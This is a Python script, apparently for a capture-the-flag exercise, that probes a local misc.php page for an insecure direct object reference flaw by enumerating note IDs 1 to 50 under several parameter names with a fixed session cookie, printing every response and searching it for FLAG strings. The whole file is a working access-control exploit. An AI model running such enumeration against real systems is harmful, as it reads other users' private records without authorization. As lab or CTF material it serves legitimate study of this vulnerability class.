import requests
import re

# Configuration
base_url = "http://127.0.0.1/misc.php"
session_cookie = "17f3f417d868573c3079e3f6ee928eb6"

# Cookie setup
cookies = {
    'PHPSESSID': session_cookie
}

# Parameter names to test
param_names = ['note_id', 'noteid', 'id', 'note', 'nid']

# Test range of note IDs
note_ids = range(1, 51)

print("[*] Starting IDOR test on misc.php")
print(f"[*] Testing note IDs 1-50 with different parameter combinations")
print("=" * 60)

# Track successful accesses
successful_accesses = []

for param_name in param_names:
    print(f"\n[+] Testing parameter: {param_name}")
    
    for note_id in note_ids:
        # Test without action=view
        params1 = {param_name: note_id}
        try:
            resp1 = requests.get(base_url, cookies=cookies, params=params1, timeout=5)
            # Check if response has content (not empty)
            if resp1.text.strip() and len(resp1.text) > 0:
                print(f"\n[!] FOUND CONTENT - Param: {param_name}={note_id} (no action)")
                print(f"[!] Status: {resp1.status_code} | Length: {len(resp1.text)}")
                print(f"[!] Full Response:\n{resp1.text}")
                print("-" * 50)
                
                # Check for FLAG in response
                flags = re.findall(r'FLAG\{[^}]+\}', resp1.text)
                if flags:
                    print(f"[CRITICAL] FLAG FOUND: {flags}")
                
                successful_accesses.append({
                    'param': param_name,
                    'note_id': note_id,
                    'action': None,
                    'status': resp1.status_code,
                    'length': len(resp1.text),
                    'response': resp1.text
                })
        except Exception as e:
            print(f"[-] Error with {param_name}={note_id} (no action): {e}")
        
        # Test with action=view
        params2 = {param_name: note_id, 'action': 'view'}
        try:
            resp2 = requests.get(base_url, cookies=cookies, params=params2, timeout=5)
            # Check if response has content (not empty)
            if resp2.text.strip() and len(resp2.text) > 0:
                print(f"\n[!] FOUND CONTENT - Param: {param_name}={note_id} (action=view)")
                print(f"[!] Status: {resp2.status_code} | Length: {len(resp2.text)}")
                print(f"[!] Full Response:\n{resp2.text}")
                print("-" * 50)
                
                # Check for FLAG in response
                flags = re.findall(r'FLAG\{[^}]+\}', resp2.text)
                if flags:
                    print(f"[CRITICAL] FLAG FOUND: {flags}")
                
                successful_accesses.append({
                    'param': param_name,
                    'note_id': note_id,
                    'action': 'view',
                    'status': resp2.status_code,
                    'length': len(resp2.text),
                    'response': resp2.text
                })
        except Exception as e:
            print(f"[-] Error with {param_name}={note_id} (action=view): {e}")

# Summary
print("\n" + "=" * 60)
print("[*] IDOR Test Complete")
print(f"[+] Total successful accesses: {len(successful_accesses)}")

if successful_accesses:
    print("\n[!] POTENTIAL IDOR VULNERABILITY DETECTED!")
    print("[!] The following notes were accessible:")
    for access in successful_accesses:
        action_str = f" (action={access['action']})" if access['action'] else ""
        print(f"  - {access['param']}={access['note_id']}{action_str} - Status: {access['status']}, Length: {access['length']}")
else:
    print("[-] No accessible notes found in the tested range.")

